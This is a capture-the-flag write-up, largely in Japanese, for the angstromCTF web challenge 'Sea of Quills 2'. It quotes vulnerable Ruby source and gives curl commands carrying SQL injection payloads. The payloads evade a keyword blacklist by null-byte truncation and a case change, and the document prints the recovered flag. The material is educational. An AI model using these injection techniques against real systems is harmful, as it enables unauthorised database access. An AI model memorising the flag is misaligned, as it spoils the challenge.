# Sea of Quills 2:Web:160pts
A little bird told me my original quills store was vulnerable to illegal hacking! I've fixed [my store now](https://seaofquills-two.2021.chall.actf.co/) though, and now it should be impossible to hack!  
[Source](app.rb)  

# Solution
サイトの構成は[Sea of Quills](../Sea_of_Quills)と同じなようだ。  
配布されたapp.rbを見てみる。  
```ruby
~~~
db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\"", "flag"]
	
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	
	if cols.length > 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
~~~
```
ブラックリストにflagが追加され、文字数制限もついているようだ。  
まずは文字数制限を突破したい。  
SQL文を中断させたいが終端やコメントを示す記号はブラックリストに入っている。  
ここでヌルバイトでもSQL文が終了することに気づく。  
以下のように試すことができる。  
```bash
$ curl -X POST https://seaofquills-two.2021.chall.actf.co/quills -d "limit=1000&offset=0&cols=* from sqlite_master %00"
~~~
                                        <img src="table" class="w3 h3">
                                <li class="pb5 pl3">quills <ul><li>quills</li></ul></li><br />

                                        <img src="table" class="w3 h3">
                                <li class="pb5 pl3">flagtable <ul><li>flagtable</li></ul></li><br />
~~~
```
先ほどと同じテーブル構成のようだ。  
次にブラックリスト中のflagを突破する。  
これはSQLiteがテーブル名の大文字小文字を区別しないことより、Flagとすればよい。  
```bash
$ curl -X POST https://seaofquills-two.2021.chall.actf.co/quills -d "limit=1000&offset=0&cols=* from Flagtable %00"
~~~
                                        <img src="actf{the_time_we_have_spent_together_riding_through_this_english_denylist_c0776ee734497ca81cbd55ea}" class="w3 h3">
                                <li class="pb5 pl3"> <ul><li></li></ul></li><br />
~~~
```
flagが入っていた。  

## actf{the_time_we_have_spent_together_riding_through_this_english_denylist_c0776ee734497ca81cbd55ea}